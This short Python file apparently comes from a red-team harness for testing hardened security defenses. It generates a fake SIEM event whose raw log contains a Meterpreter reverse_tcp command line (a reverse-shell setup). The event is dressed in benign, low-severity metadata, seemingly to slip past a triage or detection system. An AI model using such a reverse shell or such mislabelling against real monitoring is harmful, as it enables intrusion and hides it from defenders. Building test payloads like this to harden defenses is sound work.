"""
MUTABLE FILE — Red Team v2: testing hardened defenses.
"""


def generate_payload() -> dict:
    # Exp 50: meterpreter + benign metadata
    return {
        "task_type": "config_update",
        "severity": "low",
        "siem_event": {
            "title": "Process Execution Log",
            "source_ip": "10.0.1.50",
            "username": "svc_procmon",
            "hostname": "ws-admin-01",
            "rule_name": "ApplicationLog",
            "raw_log": (
                "EventID=4688 Process=metsvc.exe "
                "CommandLine='meterpreter reverse_tcp LHOST=10.0.1.100 LPORT=4444' "
                "Account=DOMAIN\\admin PID=5678"
            ),
        },
    }
